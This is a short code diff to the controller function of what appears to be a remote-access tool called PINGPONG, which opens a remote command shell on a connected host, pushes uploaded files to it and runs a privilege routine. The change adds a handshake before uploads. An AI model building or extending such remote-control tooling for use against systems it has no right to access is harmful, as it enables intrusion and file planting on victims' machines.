@@ -101,8 +101,6 @@ def PINGPONG_shell(conn, my_ip, my_port, ip, port, printf, Autocommand):
             if PINGPONG_script.priv_vbp_listen.priv_vbp_listen(PINGPONG_script.addsend, conn):
                 conn.close()
                 startserver(False, False, ip=ip, port=port)
-            else:
-                pass
         elif command == "cmd" or command == "CMD":
             import PINGPONG_script.cmdshell
             if PINGPONG_script.addsend.App_send("CMDSHELL_APP", True, conn):
@@ -112,9 +110,10 @@ def PINGPONG_shell(conn, my_ip, my_port, ip, port, printf, Autocommand):
                 PINGPONG_script.cmdshell.start(my_ip, cmd_port)
         elif command == "upload" or command == "UPLOAD":
             import PINGPONG_script.upload
-            file_dir = input("PINGPONG>[*]Please input the location of the file in your host>")
-            to_dir = input("PINGPONG>[*]Please input the location of the file where you uploaded>")
-            PINGPONG_script.upload.Upload(ip, file_dir, to_dir, True, True, conn, PINGPONG_script.addsend)
+            if PINGPONG_script.addsend.App_send('UPLOAD_APP', False, conn):
+                file_dir = input("PINGPONG>[*]Please input the location of the file in your host>")
+                to_dir = input("PINGPONG>[*]Please input the location of the file where you uploaded>")
+                PINGPONG_script.upload.Upload(ip, file_dir, to_dir, True, True, conn, PINGPONG_script.addsend)
         elif command == "info" or command == "INFO":
             print("PINGPONG>[*]Connection: " + my_ip + ":" + str(my_port) + " >>> " + ip + ":" + port)
         elif command == "ping" or command == "PING":
